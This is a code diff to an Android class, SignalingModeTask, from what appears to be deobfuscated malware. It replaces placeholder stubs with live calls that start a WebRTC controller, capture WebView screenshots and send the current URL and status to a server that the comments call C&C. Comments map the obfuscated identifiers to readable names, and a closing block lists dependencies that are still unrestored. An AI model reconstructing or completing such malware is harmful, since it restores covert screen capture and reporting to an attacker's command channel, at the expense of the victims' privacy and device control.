@@ -99,8 +99,9 @@ public class SignalingModeTask extends WebViewAutomationBase {
             try {
                 // Also stop the WebRTCController
                 // Original: webRTCController.IIIlIllIlI1() → webRTCController.stop()
-                if (SignalingModeTask.this.webRTCController != null) {
-                    // webRTCController.stop();
+                WebRTCController controller = (WebRTCController) SignalingModeTask.this.webRTCController;
+                if (controller != null) {
+                    controller.stop();
                 }
             } catch (Throwable th) {
                 Log.e(TAG, "destroy error2: " + th);
@@ -184,8 +185,7 @@ public class SignalingModeTask extends WebViewAutomationBase {
     public void cleanup() {
         // Post cleanup to main thread
         // Original: IlIlllIIlI1.lIIIIlllllIlll1.llllIIIIll1(new SignalingCleanupRunnable());
-        // AppContext.postToMainThread(new SignalingCleanupRunnable());
-        new SignalingCleanupRunnable().run(); // Placeholder - should be posted to main thread
+        AppContext.postToMainThread(new SignalingCleanupRunnable());
     }
 
     /**
@@ -197,8 +197,7 @@ public class SignalingModeTask extends WebViewAutomationBase {
     @Override
     public boolean isSignalingActive() {
         // Original: return IlIlllIIlI1.lIIIIlllllIlll1.IlIllIlllIllI1().IIlIllIIll1();
-        // return AppContext.getSignalingConnection().isConnected();
-        return false; // Placeholder
+        return AppContext.getSignalingConnection().isConnected();
     }
 
     /**
@@ -208,9 +207,10 @@ public class SignalingModeTask extends WebViewAutomationBase {
     @Override
     public void onWebViewReady() {
         // Create WebRTCController with a random session UUID
-        // Original: new llIIIIlIlllIII1.IllIIlIIII1(UUID.randomUUID().toString(), this)
-        // this.webRTCController = new WebRTCController(UUID.randomUUID().toString(), this);
-        // PreferencesHelper.scheduleDelay(500L);
+        // Original: this.f474lIlllIIIII1 = new llIIIIlIlllIII1.IllIIlIIII1(UUID.randomUUID().toString(), this);
+        this.webRTCController = new WebRTCController(UUID.randomUUID().toString(), this);
+        // Original: IIlIllIIll1.llllIIIIll1(500L);
+        PreferencesHelper.scheduleDelay(500L);
     }
 
     /**
@@ -221,9 +221,10 @@ public class SignalingModeTask extends WebViewAutomationBase {
      */
     @Override
     public Bitmap captureScreenshot(WebView webView) {
-        // Original: webRTCController.llllIIIIll1(1000L) → captureScreenshot(1000L)
-        if (this.webRTCController != null) {
-            // return ((WebRTCController) this.webRTCController).captureScreenshot(1000L);
+        // Original: illIIlIIII1.llllIIIIll1(1000L) → captureScreenshot(1000L)
+        WebRTCController controller = (WebRTCController) this.webRTCController;
+        if (controller != null) {
+            return controller.captureScreenshot(1000L);
         }
         return null;
     }
@@ -253,19 +254,47 @@ public class SignalingModeTask extends WebViewAutomationBase {
             Log.i(TAG, "updateSignalStatus: " + statusCode);
 
             // Get current URL on UI thread (only populated for IN_LANDING status)
+            // Original: IlIlllIIlI1.lIIIIlllllIlll1.lIIIIlllllIlll1(new lIIIIlllllIlll1(fromValue, strArr));
             String[] urlHolder = new String[1];
-            // Original: IlIlllIIlI1.lIIIIlllllIlll1.lIIIIlllllIlll1(new GetUrlRunnable(status, urlHolder));
-            // AppContext.runOnMainThreadSync(new GetUrlRunnable(status, urlHolder));
-            new GetUrlRunnable(status, urlHolder).run(); // Placeholder
+            AppContext.runOnMainThreadSync(new GetUrlRunnable(status, urlHolder));
             String currentUrl = urlHolder[0];
 
             Log.i(TAG, "updateSignalStatus url: " + statusCode + ", url: " + currentUrl);
 
             // Send status update to C&C via signaling connection
-            // Original: signalingConnection.llllIIIIll1(getOfferId(), status, currentUrl, new StatusUpdateCallback(status));
-            // signalingConnection.updateSignalingStatus(getOfferId(), status, currentUrl, new StatusUpdateCallback(status));
+            // Original: IlIlllIIlI12.llllIIIIll1(IlIllIlllIllI1(), fromValue, str, new llllIllIl1(fromValue));
+            Object /* SignalingConnection */ signalingConnection =
+                    AppContext.taskConfig.getSignalingConnection();
+            if (signalingConnection != null) {
+                ((SignalingConnection) signalingConnection).updateSignalingStatus(
+                        getOfferId(), status, currentUrl, new StatusUpdateCallback(status));
+            }
         } catch (Exception e) {
             Log.e(TAG, "updateSignalingStatus error: " + e);
         }
     }
+
+    // =========================================================================
+    // Placeholder types for unrestored dependencies
+    // =========================================================================
+
+    /*
+     * WebRTCController (llIIIIlIlllIII1.IllIIlIIII1):
+     *   - Constructor: WebRTCController(String sessionId, SignalingModeTask task)
+     *   - Bitmap captureScreenshot(long timeoutMs) — captures screen via WebRTC
+     *   - void stop() — stops the WebRTC controller and releases resources
+     *
+     * AppContext (IlIlllIIlI1.lIIIIlllllIlll1):
+     *   - static SignalingConnection getSignalingConnection()
+     *   - static void postToMainThread(Runnable)
+     *   - static void runOnMainThreadSync(Runnable)
+     *   - static TaskConfig taskConfig
+     *
+     * SignalingConnection (IlIlIIlIII1.lIIIIlllllIlll1):
+     *   - boolean isConnected()
+     *   - void updateSignalingStatus(String offerId, Status status, String url, Callback callback)
+     *
+     * PreferencesHelper (IlIlIIIlIlIlll1.IIlIllIIll1):
+     *   - static void scheduleDelay(long millis) — schedules a delay before task execution
+     */
 }
